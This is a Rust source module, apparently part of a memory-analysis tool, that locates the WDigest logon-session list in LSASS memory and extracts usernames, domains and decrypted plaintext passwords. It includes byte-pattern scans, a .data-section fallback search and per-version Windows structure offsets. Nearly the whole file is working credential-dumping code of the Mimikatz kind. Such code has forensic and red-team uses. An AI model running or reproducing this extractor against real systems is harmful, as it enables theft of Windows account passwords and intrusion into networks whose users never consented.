use crate::error::Result;
use crate::lsass::crypto::CryptoKeys;
use crate::lsass::patterns;
use crate::lsass::types::WdigestCredential;
use crate::memory::VirtualMemory;
use crate::pe::parser::PeHeaders;

/// WDigest list entry offsets (Windows 10 x64).
/// KIWI_WDIGEST_LIST_ENTRY layout:
///   +0x00: Flink (PTR)
///   +0x08: Blink (PTR)
///   +0x10: UsageCount (ULONG + 4 pad)
///   +0x18: This (PTR - self pointer)
///   +0x20: LUID (8 bytes)
///   +0x28: (padding/unknown)
///   +0x30: UserName (UNICODE_STRING, 16 bytes)
///   +0x40: HostName (UNICODE_STRING, 16 bytes)
///   +0x50: Password (UNICODE_STRING, 16 bytes, encrypted)
struct WdigestOffsets {
    flink: u64,
    luid: u64,
    username: u64,
    domain: u64,
    password: u64,
}

/// Multiple offset variants for different Windows versions.
const WDIGEST_OFFSET_VARIANTS: &[WdigestOffsets] = &[
    // Win10 1507+ / Win11: extra This+padding before LUID
    WdigestOffsets {
        flink: 0x00,
        luid: 0x20,
        username: 0x30,
        domain: 0x40,
        password: 0x50,
    },
    // Win7 / Win8 / Win8.1: no extra padding, smaller struct
    WdigestOffsets {
        flink: 0x00,
        luid: 0x10,
        username: 0x28,
        domain: 0x38,
        password: 0x48,
    },
];

/// Extract WDigest credentials (plaintext passwords) from wdigest.dll.
pub fn extract_wdigest_credentials(
    vmem: &impl VirtualMemory,
    wdigest_base: u64,
    _wdigest_size: u32,
    keys: &CryptoKeys,
) -> Result<Vec<(u64, WdigestCredential)>> {
    let pe = PeHeaders::parse_from_memory(vmem, wdigest_base)?;
    let mut results = Vec::new();

    let text = match pe.find_section(".text") {
        Some(s) => s,
        None => return Ok(results),
    };

    let text_base = wdigest_base + text.virtual_address as u64;

    // Pattern scan for l_LogSessList
    let list_addr = match patterns::find_pattern(
        vmem,
        text_base,
        text.virtual_size,
        patterns::WDIGEST_LOGON_SESSION_PATTERNS,
        "wdigest_l_LogSessList",
    ) {
        Ok((pattern_addr, _)) => {
            let addr = find_wdigest_list(vmem, pattern_addr)?;
            // Validate: flink should be a valid heap pointer or self-reference
            let flink = vmem.read_virt_u64(addr).unwrap_or(0);
            if flink != 0 && flink != addr && (flink >> 48) == 0 && flink > 0x10000 {
                addr
            } else {
                log::info!("Pattern-resolved l_LogSessList at 0x{:x} has invalid flink 0x{:x}, falling back to .data scan", addr, flink);
                find_wdigest_list_in_data(vmem, &pe, wdigest_base, keys)?
            }
        }
        Err(e) => {
            log::info!("Code pattern scan failed (likely paged out): {}", e);
            find_wdigest_list_in_data(vmem, &pe, wdigest_base, keys)?
        }
    };
    log::info!("WDigest l_LogSessList at 0x{:x}", list_addr);

    // Walk the list
    let head_flink = vmem.read_virt_u64(list_addr)?;
    if head_flink == 0 || head_flink == list_addr {
        return Ok(results);
    }

    // Dump first entry for offset analysis
    if log::log_enabled!(log::Level::Debug) {
        if let Ok(entry_dump) = vmem.read_virt_bytes(head_flink, 0x70) {
            log::debug!("WDigest first entry at 0x{:x} dump:", head_flink);
            for (i, chunk) in entry_dump.chunks(16).enumerate() {
                let hex_str: String = chunk
                    .iter()
                    .map(|b| format!("{:02x}", b))
                    .collect::<Vec<_>>()
                    .join(" ");
                let ascii: String = chunk
                    .iter()
                    .map(|&b| {
                        if (0x20..0x7f).contains(&b) {
                            b as char
                        } else {
                            '.'
                        }
                    })
                    .collect();
                log::debug!("  {:04x}: {}  {}", i * 16, hex_str, ascii);
            }
        }
    }

    // Auto-detect offset variant: try each variant on the first entry
    let offsets = detect_wdigest_offsets(vmem, head_flink);
    let mut current = head_flink;
    let mut visited = std::collections::HashSet::new();

    loop {
        if current == list_addr || visited.contains(&current) || current == 0 {
            break;
        }
        visited.insert(current);

        let luid = vmem.read_virt_u64(current + offsets.luid).unwrap_or(0);
        let username = vmem
            .read_win_unicode_string(current + offsets.username)
            .unwrap_or_default();
        let domain = vmem
            .read_win_unicode_string(current + offsets.domain)
            .unwrap_or_default();

        if username.is_empty() {
            current = match vmem.read_virt_u64(current + offsets.flink) {
                Ok(f) => f,
                Err(_) => break,
            };
            continue;
        }

        let password = crate::lsass::crypto::decrypt_unicode_string_password(
            vmem,
            current + offsets.password,
            keys,
        );

        log::debug!(
            "WDigest: LUID=0x{:x} user={} domain={} pwd_len={}",
            luid,
            username,
            domain,
            password.len()
        );
        results.push((
            luid,
            WdigestCredential {
                username: username.clone(),
                domain: domain.clone(),
                password,
            },
        ));

        current = match vmem.read_virt_u64(current + offsets.flink) {
            Ok(f) => f,
            Err(_) => break,
        };
    }

    let with_passwords = results
        .iter()
        .filter(|(_, c)| !c.password.is_empty())
        .count();
    log::info!(
        "WDigest: found {} entries ({} with passwords)",
        results.len(),
        with_passwords
    );

    Ok(results)
}

/// Fallback: scan .data section for WDigest l_LogSessList LIST_ENTRY head.
fn find_wdigest_list_in_data(
    vmem: &impl VirtualMemory,
    pe: &PeHeaders,
    wdigest_base: u64,
    _keys: &CryptoKeys,
) -> Result<u64> {
    let data_sec = pe.find_section(".data").ok_or_else(|| {
        crate::error::GovmemError::PatternNotFound(".data section in wdigest.dll".to_string())
    })?;

    let data_base = wdigest_base + data_sec.virtual_address as u64;
    let data_size = std::cmp::min(data_sec.virtual_size as usize, 0x10000);
    let data = vmem.read_virt_bytes(data_base, data_size)?;

    log::debug!(
        "Scanning wdigest.dll .data for LIST_ENTRY heads: base=0x{:x} size=0x{:x}",
        data_base,
        data_size
    );

    for off in (0..data_size.saturating_sub(16)).step_by(8) {
        let flink = u64::from_le_bytes(data[off..off + 8].try_into().unwrap());
        let blink = u64::from_le_bytes(data[off + 8..off + 16].try_into().unwrap());

        if flink < 0x10000 || (flink >> 48) != 0 {
            continue;
        }
        if blink < 0x10000 || (blink >> 48) != 0 {
            continue;
        }
        if flink >= wdigest_base && flink < wdigest_base + 0x100000 {
            continue;
        }

        let list_addr = data_base + off as u64;

        // Validate: first entry's Flink should be a valid pointer or point back to list_addr
        let entry_flink = match vmem.read_virt_u64(flink) {
            Ok(f) => f,
            Err(_) => continue,
        };
        if entry_flink != list_addr && (entry_flink < 0x10000 || (entry_flink >> 48) != 0) {
            continue;
        }

        // Validate by reading first entry (try each offset variant)
        let offsets = detect_wdigest_offsets(vmem, flink);
        let luid = match vmem.read_virt_u64(flink + offsets.luid) {
            Ok(l) => l,
            Err(_) => continue,
        };
        if luid == 0 || luid > 0xFFFFFFFF {
            continue;
        }

        let username = vmem
            .read_win_unicode_string(flink + offsets.username)
            .unwrap_or_default();
        if username.is_empty() || username.len() > 256 {
            continue;
        }

        log::debug!(
            "Found l_LogSessList candidate at 0x{:x}: flink=0x{:x} entry_flink=0x{:x} LUID=0x{:x} user='{}'",
            list_addr, flink, entry_flink, luid, username
        );
        return Ok(list_addr);
    }

    Err(crate::error::GovmemError::PatternNotFound(
        "l_LogSessList in wdigest.dll .data section".to_string(),
    ))
}

fn find_wdigest_list(vmem: &impl VirtualMemory, pattern_addr: u64) -> Result<u64> {
    // Search backward and forward for LEA instruction
    let search_start = pattern_addr.saturating_sub(0x30);
    let data = vmem.read_virt_bytes(search_start, 0x100)?;

    for i in 0..data.len().saturating_sub(6) {
        let is_lea = (data[i] == 0x48
            && data[i + 1] == 0x8D
            && (data[i + 2] == 0x0D || data[i + 2] == 0x15))
            || (data[i] == 0x4C
                && data[i + 1] == 0x8D
                && (data[i + 2] == 0x05 || data[i + 2] == 0x0D));
        if is_lea {
            return patterns::resolve_rip_relative(vmem, search_start + i as u64, 3);
        }
    }

    Err(crate::error::GovmemError::PatternNotFound(
        "LEA for wdigest l_LogSessList".to_string(),
    ))
}

/// Auto-detect WDigest offset variant by probing the first entry.
fn detect_wdigest_offsets(vmem: &impl VirtualMemory, first_entry: u64) -> &'static WdigestOffsets {
    for variant in WDIGEST_OFFSET_VARIANTS {
        // Check LUID: should be small nonzero value
        let luid = match vmem.read_virt_u64(first_entry + variant.luid) {
            Ok(l) => l,
            Err(_) => continue,
        };
        if luid == 0 || luid > 0xFFFFFFFF {
            continue;
        }
        // Check username: should be valid UNICODE_STRING
        let username = vmem
            .read_win_unicode_string(first_entry + variant.username)
            .unwrap_or_default();
        if !username.is_empty() && username.len() < 256 {
            return variant;
        }
    }
    // Default to Win10+ offsets
    &WDIGEST_OFFSET_VARIANTS[0]
}
